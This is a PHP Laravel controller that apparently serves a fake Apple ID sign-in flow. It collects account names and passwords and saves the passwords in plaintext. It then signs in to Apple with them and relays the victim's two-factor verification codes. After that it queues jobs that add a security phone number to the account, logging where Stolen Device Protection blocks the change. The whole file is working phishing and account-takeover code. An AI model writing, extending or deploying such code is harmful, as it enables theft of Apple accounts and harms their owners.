<?php

namespace App\Http\Controllers;

use App\Apple\Enums\AccountStatus;
use App\Http\Requests\SmsSecurityCodeRequest;
use App\Http\Requests\VerifyAccountRequest;
use App\Http\Requests\VerifySecurityCodeRequest;
use App\Jobs\BindAccountPhone;
use App\Jobs\UpdateAccountInfoJob;
use App\Jobs\AppleidAddSecurityVerifyPhone;
use Illuminate\Contracts\View\Factory;
use Illuminate\Contracts\View\View;
use Illuminate\Foundation\Application;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Cookie;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Session;
use Illuminate\Support\Facades\Validator;
use Illuminate\Support\Facades\Bus;
use JsonException;
use App\Services\AppleClientControllerService;
use Psr\Log\LoggerInterface;
use Psr\SimpleCache\CacheInterface;
use Saloon\Exceptions\Request\FatalRequestException;
use Saloon\Exceptions\Request\RequestException;
use App\Models\Account;
use Weijiajia\SaloonphpAppleClient\DataConstruct\PhoneNumber;
use Weijiajia\SaloonphpAppleClient\Exception\Phone\PhoneNotFoundException;
use Weijiajia\SaloonphpAppleClient\Exception\SignInException;
use Weijiajia\SaloonphpAppleClient\Exception\StolenDeviceProtectionException;
use Weijiajia\SaloonphpAppleClient\Exception\VerificationCodeException;
use Weijiajia\SaloonphpAppleClient\Exception\VerificationCodeSentTooManyTimesException;
use Saloon\Exceptions\SaloonException;
use App\Services\Trait\IpInfo;
use App\Models\SecuritySetting;
use App\Exceptions\AccountAlreadyBindException;

class AppleClientController extends Controller
{
    use IpInfo;
    public function __construct(
        protected readonly Request $request,
        protected readonly LoggerInterface $logger,
        protected readonly CacheInterface $cache,
    ) {}

    public function index(Request $request): Factory|Application|View|\Illuminate\Contracts\Foundation\Application
    {
        Session::flash('account', $request->input('account', ''));
        Session::flash('password', $request->input('password', ''));

        return view('index/index');
    }

    public function signin(Request $request)
    {

        $securitySetting = SecuritySetting::first();
        $countryCode = $securitySetting?->configuration['country_code'] ?? config('apple.country_code');

        // 读取公钥并准备传递给视图
        $publicKey = null;
        try {
            $publicKeyPath = config_path('encryption/public.key');
            if (File::exists($publicKeyPath)) {
                $publicKey = File::get($publicKeyPath);
            } else {
                $this->logger->error('Public encryption key not found, client-side encryption will be disabled.');
            }
        } catch (\Exception $e) {
            $this->logger->error('Failed to read public encryption key: ' . $e->getMessage());
        }

        $data = [
            'account'  => Session::get('account', ''),
            'password' => Session::get('password', ''),
            'country_code' => $countryCode,
            'publicKey' => $publicKey, // 将公钥传递给视图
        ];

        return response()
            ->view('index/signin', compact('data'));
    }

    public function logger(): LoggerInterface
    {
        return $this->logger;
    }

    /**
     * @param VerifyAccountRequest $request
     * @return JsonResponse
     * @throws FatalRequestException
     * @throws JsonException
     * @throws RequestException
     * @throws \Throwable
     * @throws SignInException
     */
    public function verifyAccount(
        VerifyAccountRequest $request
    ): JsonResponse {


        $validatedData = $request->validated();

        try {


            $account = $validatedData['accountName'];
            $password = $validatedData['password'];

            $this->cacheAccountIp($account);
            $this->ipInfo();

            $apple = Account::withTrashed()->where('appleid', $account)->first();

            if ($apple) {

                if ($apple->bind_phone || in_array($apple->status, [AccountStatus::BIND_RETRY, AccountStatus::BIND_ING])) {
                    throw new AccountAlreadyBindException(__('apple.signin.account_bind_phone'));
                }

                $apple->password = $password;
                $apple->save();
            } else {
                $apple = Account::create([
                    'appleid'  => $account,
                    'password' => $password,
                ]);
                $apple->delete();
            }

            $apple->config()->add('apple_auth_url', value: config('apple.apple_auth_url'));

            $apple->appleIdResource()->signIn();

            $auth = $apple->appleIdResource()->appleAuth();

            $guid = base64_encode($account);

            $cookie = Cookie::make('Guid', $guid)
                ->withHttpOnly(false);

            if ($auth->hasTrustedDevices() || $auth->getTrustedPhoneNumbers()->count() === 0) {
                return $this->success(data: [
                    'Guid' => $guid,
                    'Devices' => true,
                ], code: 201)->cookie($cookie);
            }

            if ($auth->getTrustedPhoneNumbers()->count() >= 2) {
                return $this->success(data: [
                    'Guid' => $guid,
                    'Devices' => false,
                ], code: 202)->cookie($cookie);
            }

            /**
             * @var PhoneNumber $trustedPhoneNumbers
             */
            $trustedPhoneNumbers = $auth->getTrustedPhoneNumbers()->toCollection()->first();

            return $this->success(data: [
                'Guid'   => $guid,
                'Devices' => false,
                'ID'     => $trustedPhoneNumbers->id,
                'Number' => $trustedPhoneNumbers->numberWithDialCode,
            ], code: 203)->cookie($cookie);
        } catch (\Throwable $e) {
            if ($e instanceof AccountAlreadyBindException) {
                throw new SignInException($e->getMessage());
            }
            throw new SignInException(__('apple.signin.incorrect'));
        }
    }

    public function auth(): Factory|Application|View|\Illuminate\Contracts\Foundation\Application
    {
        return view('index/auth');
    }

    /**
     * @param AppleClientControllerService $controllerService
     * @return Factory|Application|View|\Illuminate\Contracts\Foundation\Application|JsonResponse
     * @throws FatalRequestException
     * @throws RequestException
     * @throws JsonException
     */
    public function authPhoneList(
        AppleClientControllerService $controllerService
    ): Factory|Application|View|\Illuminate\Contracts\Foundation\Application|JsonResponse {
        return view('index.auth-phone-list', ['trustedPhoneNumbers' => $controllerService->getTrustedPhoneNumbers()]);
    }

    /**
     * @param VerifySecurityCodeRequest $request
     * @param AppleClientControllerService $controllerService
     * @return JsonResponse
     * @throws FatalRequestException
     * @throws RequestException
     * @throws StolenDeviceProtectionException
     * @throws VerificationCodeException
     * @throws JsonException
     */
    public function verifySecurityCode(
        VerifySecurityCodeRequest $request,
        AppleClientControllerService $controllerService
    ): JsonResponse {
        $validated = $request->validated();

        $controllerService->verifySecurityCode($validated['apple_verifycode']);

        if ($controllerService->isStolenDeviceProtectionException() === true) {

            //已开启"失窃设备保护"，无法在网页上更改部分账户信息。 若要添加电话号码，请使用其他 Apple 设备'
            $controllerService->getApple()->update(['status' => AccountStatus::THEFT_PROTECTION]);

            $controllerService->getApple()->logs()->create(
                [
                    'action' => '设备保护验证',
                    'request' => '已开启"失窃设备保护"，无法在网页上更改部分账户信息。 若要添加电话号码，请使用其他 Apple 设备',
                ]
            );

            return response()->json([
                'code'    => 403,
                'message' => '已开启"失窃设备保护"，无法在网页上更改部分账户信息。 若要添加电话号码，请使用其他 Apple 设备',
            ]);
        }

        $controllerService->getApple()->syncCookies();

        Bus::chain([
            new UpdateAccountInfoJob($controllerService->getApple()),
            new AppleidAddSecurityVerifyPhone($controllerService->getApple())
        ])->dispatch();

        return $this->success();
    }

    /**
     * @param SmsSecurityCodeRequest $request
     * @param AppleClientControllerService $controllerService
     * @return JsonResponse
     * @throws FatalRequestException
     * @throws JsonException
     * @throws RequestException
     * @throws StolenDeviceProtectionException
     * @throws VerificationCodeException|PhoneNotFoundException
     */
    public function smsSecurityCode(
        SmsSecurityCodeRequest $request,
        AppleClientControllerService $controllerService
    ): JsonResponse {

        $validated = $request->validated();

        $controllerService->verifyPhoneCode($validated['ID'], $validated['apple_verifycode']);

        if ($controllerService->isStolenDeviceProtectionException() === true) {

            $controllerService->getApple()->update(['status' => AccountStatus::THEFT_PROTECTION]);

            $controllerService->getApple()->logs()->create(
                [
                    'action' => '设备保护验证',
                    'request' => '已开启"失窃设备保护"，无法在网页上更改部分账户信息。 若要添加电话号码，请使用其他 Apple 设备',
                ]
            );

            return response()->json([
                'code'    => 403,
                'message' => '已开启"失窃设备保护"，无法在网页上更改部分账户信息。 若要添加电话号码，请使用其他 Apple 设备',
            ]);
        }


        $controllerService->getApple()->syncCookies();
        
        Bus::chain([
            new UpdateAccountInfoJob($controllerService->getApple()),
            new AppleidAddSecurityVerifyPhone($controllerService->getApple())
        ])->dispatch();

        return $this->success();
    }

    /**
     * @param AppleClientControllerService $controllerService
     * @return JsonResponse
     * @throws FatalRequestException
     * @throws RequestException
     */
    public function SendSecurityCode(AppleClientControllerService $controllerService): JsonResponse
    {
        $sendDeviceSecurityCode = $controllerService->sendSecurityCode();

        return $this->success($sendDeviceSecurityCode->toArray());
    }

    /**
     * @param AppleClientControllerService $controllerService
     * @return JsonResponse
     * @throws FatalRequestException
     * @throws RequestException
     * @throws JsonException
     */
    public function GetPhone(AppleClientControllerService $controllerService): JsonResponse
    {
        $trustedPhoneNumbers = $controllerService->getTrustedPhoneNumbers();

        if ($trustedPhoneNumbers->count() >= 2) {
            return $this->success(data: [
                'Devices' => false,
            ], code: 202);
        }

        /**
         * @var PhoneNumber $trustedPhoneNumber
         */
        $trustedPhoneNumber = $trustedPhoneNumbers->first();

        return $this->success(data: [
            'Devices' => false,
            'ID'     => $trustedPhoneNumber->id,
            'Number' => $trustedPhoneNumber->numberWithDialCode,
        ], code: 203);
    }

    /**
     * @param AppleClientControllerService $controllerService
     * @return View
     * @throws FatalRequestException
     * @throws JsonException
     * @throws RequestException
     */
    public function SendSms(AppleClientControllerService $controllerService): View
    {
        $params = Validator::make($this->request->all(), [
            'ID' => 'required|integer|min:1',
            'phoneNumber' => 'required|string|max:255',
        ])->validated();

        $message = '';
        try {


            $controllerService->sendSms((int)$params['ID']);
        } catch (VerificationCodeSentTooManyTimesException $e) {

            $message = __('apple.send_sms.verification_code_sent_too_many_times');
        } catch (JsonException | FatalRequestException | RequestException | SaloonException $e) {

            $this->logger->error($e);

            $message = __('apple.send_sms.error');
        }

        return view('index/sms', [
            'ID'           => $params['ID'],
            'phoneNumber'  => $params['phoneNumber'],
            'message'  => $message,
            'is_diffPhone' => $controllerService->getTrustedPhoneNumbers()->count() >= 2,
        ]);
    }

    /**
     * @param AppleClientControllerService $controllerService
     * @return View|Factory|Application
     * @throws FatalRequestException
     * @throws RequestException
     */
    public function sms(AppleClientControllerService $controllerService): View|Factory|Application
    {
        $trustedPhoneNumber = $controllerService->getTrustedPhoneNumber();

        return view('index/sms', [
            'ID'           => $trustedPhoneNumber->id,
            'phoneNumber'  => $trustedPhoneNumber->numberWithDialCode,
            'is_diffPhone' => false,
            'message' => null,
        ]);
    }

    public function result(): View|Factory|Application
    {
        return view('index/result');
    }

    public function stolenDeviceProtection(): View|Factory|Application
    {
        return view('index/stolen-device-protection');
    }
}
